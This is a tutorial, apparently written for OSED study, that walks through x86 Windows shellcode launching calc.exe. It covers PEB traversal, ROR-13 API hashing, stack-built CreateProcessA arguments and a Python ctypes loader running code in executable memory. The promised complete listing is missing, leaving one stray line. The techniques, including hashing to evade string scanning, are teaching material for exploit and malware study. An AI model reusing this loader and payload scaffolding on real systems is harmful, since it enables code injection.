# Mastering x86 Shellcode: A Deep Dive into Calculator-Launching Payload Development

![Assembly code showing shellcode implementation](/images/Shellcode.png)

## Introduction

In the realm of cybersecurity, shellcode represents one of the most fundamental building blocks for both offensive security practitioners and defensive analysts. These compact machine code sequences, traditionally designed to spawn command shells (hence the name), have evolved to perform virtually any programmatic action on a target system.

I developed this analysis as part of my learning journey through the Offensive Security Exploit Developer (OSED) certification, where shellcoding is a core component of the curriculum. This article represents my practical exploration of these techniques and serves as a reference for others on a similar path.

In this comprehensive analysis, we'll dissect a classic Windows shellcode example that launches the calculator application. While seemingly simple, this example serves as an excellent educational tool, demonstrating critical low-level programming techniques applicable to both security research and software development.

## Why Study Shellcode?

Understanding shellcode construction provides several benefits:

1. **Security Research**: Insight into exploitation techniques and vulnerability analysis
2. **Malware Analysis**: Ability to recognize and decode obfuscated malicious code
3. **Low-Level Programming**: Mastery of assembly language and operating system internals
4. **System Architecture**: Deeper understanding of process execution environments
5. **Performance Optimization**: Techniques applicable to high-performance computing

The calculator-launching example is particularly valuable because it's benign yet demonstrates all the critical elements found in more sophisticated payloads.

## The Complete Shellcode Implementation

Below is our complete x86 shellcode implementation with detailed annotations. Each section serves a specific purpose in our goal of launching the Windows calculator application without using standard library functions.

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))  # Wait indefinitely for thread to finish
```

Now, let's analyze this code in depth to understand how each component works.

## The Architecture of Position-Independent Code

### Stack Setup and Basic Initialization

The shellcode begins by establishing a stable execution environment:

```assembly
mov   ebp, esp                  # Save stack pointer
add   esp, 0xfffff9f0           # Create ~1600 bytes of stack space
```

This initial setup creates a stack frame and reserves a significant amount of space (approximately 1600 bytes) for our operations. What's interesting is the use of a negative value (`0xFFFFF9F0`) to allocate space—a technique employed to avoid NULL bytes in the shellcode, which could terminate string processing in exploits.

The second component is the creation of consistent register states. This is crucial for position-independent code that must function regardless of its memory location:

```assembly
xor   ecx, ecx                  # Zero out ECX register
```

This simple operation clears ECX without using immediate zero values that would create unwanted NULL bytes in our shellcode.

### Windows Internals: The Process Environment Block

Next, we navigate Windows internal structures to find Kernel32.dll, the gateway to most Windows API functions:

```assembly
mov   esi, fs:[ecx+0x30]        # Access PEB via FS segment register
mov   esi, [esi+0x0C]           # PEB->Ldr (loader data)
mov   esi, [esi+0x1C]           # InInitializationOrderModuleList
```

This segment delves into undocumented Windows internals. The FS segment register at offset 0x30 points to the Process Environment Block (PEB), a Windows data structure containing process information. By traversing this structure, we locate the Loader Data Table, which contains information about all loaded modules.

The InInitializationOrderModuleList is particularly useful because Kernel32.dll is typically the second module in this list (ntdll.dll being the first).

### Kernel32.dll Module Discovery

The next code block iterates through loaded modules to find Kernel32.dll:

```assembly
next_module:
mov   ebx, [esi+0x08]           # Store module base address
mov   edi, [esi+0x20]           # Get module name pointer
mov   esi, [esi]                # Move to next module in list
cmp   [edi+12*2], cx            # Check if it's kernel32.dll
jne   next_module               # If not, try next module
```

This loop examines each module in the initialization order list. For each module:

1. We grab its base address (stored at offset 0x08)
2. Retrieve a pointer to its name (offset 0x20)
3. Move to the next module in the linked list
4. Check a specific character in the name string (the 13th character, adjusted for Unicode)

The comparison at `[edi+12*2]` is checking for the NULL terminator in "kernel32.dll" (which is 12 characters long). When found, EBX will contain Kernel32.dll's base address—our key to resolving Windows API functions.

## Dynamic Function Resolution: The Heart of Shellcode

### The JMP/CALL/POP Trick for Self-Referencing

Position-independent code must know its own location, particularly to access embedded data. The shellcode uses a classic JMP/CALL/POP sequence to achieve this:

```assembly
find_function_shorten:
jmp find_function_shorten_bnc   # Jump to the CALL instruction
find_function_ret:
pop esi                         # ESI now has address of find_function
mov [ebp+0x04], esi             # Store for later use
jmp resolve_symbols_kernel32    # Continue execution
find_function_shorten_bnc:
call find_function_ret          # Push return address (find_function)
```

This elegant technique:
1. Jumps to a CALL instruction
2. The CALL pushes the address of the next instruction (find_function) onto the stack
3. POP retrieves this address into ESI
4. We store this address for later function resolution calls

This self-referencing approach is a cornerstone of shellcode development, allowing access to code sections without absolute addresses.

### PE Header Navigation: Understanding the Export Table

With Kernel32.dll's base address in EBX, we can locate its export table to find function addresses:

```assembly
find_function:
pushad                          # Save all registers
mov   eax, [ebx+0x3c]           # Get PE header offset
mov   edi, [ebx+eax+0x78]       # Get export directory RVA
add   edi, ebx                  # Convert to actual address
mov   ecx, [edi+0x18]           # Number of functions
mov   eax, [edi+0x20]           # Array of function names
add   eax, ebx                  # Convert to actual address
mov   [ebp-4], eax              # Store for iteration
```

This section navigates the Portable Executable (PE) file format structures:

1. First, we find the PE header using the e_lfanew field at offset 0x3C
2. Then, locate the export directory using the offset at PE+0x78
3. From the export directory, extract:
   - The number of exported functions
   - Pointer to the array of function names
   - Pointers to ordinals and function addresses

These offsets are part of the documented PE file format structure, but using them directly in assembly requires familiarity with Windows internals.

### Function Hash Calculation: The ROR-13 Algorithm

Instead of storing full function names (which would make the shellcode larger), we use a hashing algorithm to identify functions:

```assembly
compute_hash:
xor   eax, eax                  # Clear accumulator
cdq                             # Clear EDX (hash value)
cld                             # Clear direction flag

compute_hash_again:
lodsb                           # Load next character into AL
test  al, al                    # Check for null terminator
jz    compute_hash_finished     # If null, we're done
ror   edx, 0x0d                 # Rotate right by 13 bits
add   edx, eax                  # Add character to hash
jmp   compute_hash_again        # Process next character
```

This algorithm:

1. Loads each character of the function name one at a time
2. Rotates the current hash value right by 13 bits
3. Adds the current character value
4. Repeats until reaching the null terminator

The result is a 32-bit hash that, while not cryptographically secure, provides sufficient uniqueness for function identification. Using function hashes instead of names makes shellcode significantly smaller and more difficult to detect through simple string scanning.

### Finding the Function Address: Export Directory Navigation

After calculating a hash, we check if it matches our target function:

```assembly
find_function_compare:
cmp   edx, [esp+0x24]           # Compare calculated hash with target
jnz   find_function_loop        # If no match, try next function
mov   edx, [edi+0x24]           # Get ordinals table RVA
add   edx, ebx                  # Convert to address
mov   cx,  [edx+2*ecx]          # Get function ordinal
mov   edx, [edi+0x1c]           # Get function addresses table RVA
add   edx, ebx                  # Convert to address
mov   eax, [edx+4*ecx]          # Get function RVA
add   eax, ebx                  # Convert to actual address
mov   [esp+0x1c], eax           # Store in EAX position (for POPAD)
```

When a hash match is found, we:

1. Get the function's ordinal from the ordinals table
2. Use the ordinal to index into the address table
3. Extract the function's relative virtual address (RVA)
4. Convert the RVA to an actual virtual address by adding the module base
5. Store the result where it will end up in EAX after POPAD

This translation between name, ordinal, and address follows the PE export table structure, allowing us to resolve any exported function.

### Resolving Required Function Addresses

With our function resolution mechanism in place, we can find the addresses of the specific functions we need:

```assembly
resolve_symbols_kernel32:
push  0x78b5b983                # TerminateProcess hash
call dword ptr [ebp+0x04]       # Call find_function
mov   [ebp+0x10], eax           # Store TerminateProcess address
push  0x16b3fe72                # CreateProcessA hash
call dword ptr [ebp+0x04]       # Call find_function
mov   [ebp+0x18], eax           # Store CreateProcessA address
```

Here we resolve two essential functions:

1. **TerminateProcess** (hash: 0x78b5b983) - Used for clean shellcode exit
2. **CreateProcessA** (hash: 0x16b3fe72) - Used to launch the calculator

These specific hash values were pre-calculated using the same algorithm implemented in our shellcode. The resolved addresses are stored at fixed offsets from our EBP register for later use.

## Crafting Dynamic Data Structures

### Creating the Program Name on the Stack

To launch calculator, we need its command line. We create this string directly on the stack:

```assembly
launch_calc:
xor   eax, eax                  # Clear EAX register
push  eax                       # Push null terminator (0x00000000)
push  0x6578652e                # Push ".exe" (reversed)
push  0x636c6163                # Push "calc" (reversed)
mov   ebx, esp                  # EBX points to "calc.exe"
```

This technique builds a null-terminated string by pushing its components backwards onto the stack. Due to x86's little-endian byte ordering, we must reverse the string segments:

- "calc" becomes 0x636c6163 (hex representation of ASCII values in reverse)
- ".exe" becomes 0x6578652e

After pushing these values and a null terminator, ESP points to the start of our "calc.exe" string, which we save in EBX.

### Creating the STARTUPINFO Structure

Windows CreateProcess API requires a STARTUPINFO structure. We create this directly on the stack:

```assembly
create_startupinfoa:
xor   eax, eax                  # Clear EAX
# Push 16 zero values for various fields
# [multiple pushes omitted for brevity]
mov   al, 0x44                  # Set cb = 68 (size of STARTUPINFO)
push  eax                       # Push structure size
mov   esi, esp                  # ESI points to STARTUPINFO
```

The STARTUPINFO structure has 17 fields, most of which we set to zero for default behavior. The critical field is `cb` (the first field), which must be set to the structure's size (68 bytes).

By pushing all values onto the stack, we avoid the need for a static data section, keeping our shellcode position-independent and more versatile.

## Executing the Payload: Process Creation

### Preparing CreateProcessA Parameters

With our string and structure ready, we prepare to call CreateProcessA:

```assembly
call_createprocessa:
mov   eax, esp                  # Get current stack pointer
xor   ecx, ecx                  # Clear ECX
mov   cx, 0x390                 # Set to 912 bytes
sub   eax, ecx                  # Calculate space for PROCESS_INFORMATION
push  eax                       # lpProcessInformation
push  esi                       # lpStartupInfo
xor   eax, eax                  # Clear EAX
push  eax                       # lpCurrentDirectory
push  eax                       # lpEnvironment
push  eax                       # dwCreationFlags
inc   eax                       # EAX = 1
push  eax                       # bInheritHandles
dec   eax                       # EAX = 0
push  eax                       # lpThreadAttributes
push  eax                       # lpProcessAttributes
push  ebx                       # lpCommandLine = "calc.exe"
push  eax                       # lpApplicationName
```

This segment prepares the stack with the 10 parameters required by CreateProcessA:

1. First, we reserve space for the PROCESS_INFORMATION output structure (not by adjusting ESP, but by calculating an address below our current stack)
2. Then we push parameters in reverse order (standard x86 calling convention)
3. We use some register tricks (like INC/DEC) to avoid NULL bytes while still creating the values 0 and 1

The care taken to avoid NULL bytes is a reminder that shellcode is often used in exploit contexts where string operations might terminate on NULL values.

### Calling the API and Exiting

Finally, we call CreateProcessA and then terminate our own process:

```assembly
call  dword ptr [ebp+0x18]      # Call CreateProcessA

exit_properly:
xor   ecx, ecx                  # Clear ECX
push  ecx                       # uExitCode = 0
push  0xffffffff                # hProcess = -1 (current process)
call  dword ptr [ebp+0x10]      # Call TerminateProcess
```

The CreateProcessA call launches calculator using our prepared parameters. Then we call TerminateProcess with:
- A process handle of 0xFFFFFFFF (-1), which is a special value referring to the current process
- An exit code of 0, indicating successful execution

## Shellcode Execution Environment

The Python wrapper around our shellcode performs several key functions:

```python
# Allocate executable memory
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))

# Copy shellcode to allocated memory
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))

# Execute shellcode in a new thread
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))

# Wait for thread completion
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
```

1. **Memory Allocation**:
   - VirtualAlloc creates a memory block with PAGE_EXECUTE_READWRITE permissions (0x40)
   - The allocation type (0x3000) combines MEM_COMMIT and MEM_RESERVE flags

2. **Shellcode Transfer**:
   - RtlMoveMemory copies our shellcode bytes to the allocated memory
   - This is essentially a memcpy operation

3. **Execution**:
   - CreateThread creates a new thread with our shellcode as the entry point
   - WaitForSingleObject blocks until the shellcode thread completes execution

This execution model represents a simplified version of how shellcode might be deployed in a real exploit scenario, though actual exploits would inject the shellcode into a vulnerable process rather than running it directly.

## Advanced Techniques and Variations

### Avoiding Bad Characters

Our shellcode carefully avoids NULL bytes (0x00), which would terminate string operations in many exploit scenarios. This is achieved through techniques like:

- Using `xor reg, reg` instead of `mov reg, 0`
- Using two's complement values (like 0xFFFFF9F0 instead of -1600)
- Using `inc`/`dec` instead of direct moves for small values
- Constructing values indirectly

For different exploit contexts, other characters might also need to be avoided, requiring additional shellcode engineering.

### Handling ASLR and DEP Protections

Modern Windows systems implement Address Space Layout Randomization (ASLR) and Data Execution Prevention (DEP). Our shellcode addresses these:

- **ASLR**: By dynamically finding module addresses through PEB traversal rather than hardcoding
- **DEP**: Our execution wrapper explicitly allocates memory with execute permissions

In real exploit scenarios, additional techniques like Return-Oriented Programming (ROP) might be needed to bypass these protections.

### Alternative Function Resolution Methods

While our shellcode uses function hashing, other approaches include:

1. **Hardcoded offsets**: For specific Windows versions (less portable)
2. **Import table parsing**: Finding functions by walking the Import Address Table
3. **Forward searching**: Scanning memory for function prologues
4. **API hooking**: Replacing existing API calls to intercept execution

Each method has trade-offs in terms of size, complexity, and reliability across different system versions.

## Practical Applications and Learning Extensions

### Security Research Applications

Understanding shellcode construction is invaluable for:

1. **Exploit Development**: Creating custom payloads for penetration testing
2. **Vulnerability Research**: Understanding the impact of memory corruption bugs
3. **Malware Analysis**: Recognizing shellcode patterns in malicious software
4. **Intrusion Detection**: Developing signatures for common shellcode techniques

### Study Extensions

To build on this knowledge, consider exploring:

1. **Different Architectures**: Adapting techniques for x64, ARM, or MIPS
2. **Alternative Payloads**: Creating shellcode for different actions (file operations, networking, etc.)
3. **Obfuscation Techniques**: Implementing encryption or metamorphic code to evade detection
4. **Sandbox Evasion**: Adding environmental checks to avoid analysis environments
5. **Cross-Platform Shellcode**: Creating payloads that work across different operating systems

## Conclusion

Our calculator-launching shellcode demonstrates fundamental techniques critical to understanding low-level software security:

1. **Position-Independent Code**: Operating without assumptions about memory location
2. **Windows Internal Navigation**: Finding key structures without API assistance
3. **Dynamic Function Resolution**: Locating API functions using hashing techniques
4. **Stack-Based Structure Creation**: Building complex data structures dynamically
5. **Clean Execution Flow**: Properly initializing, executing, and terminating processes

These techniques transcend the simple example presented here, forming the foundation for both offensive security research and defensive analysis. Whether you're studying malware, developing exploits for legitimate security testing, or simply seeking a deeper understanding of how software interacts with operating systems, shellcode analysis provides unique insights unavailable through higher-level programming approaches.

By mastering these concepts, you gain not just technical skills but also a deeper appreciation for the intricate dance between code, memory, and the operating system that underpins all computer security.
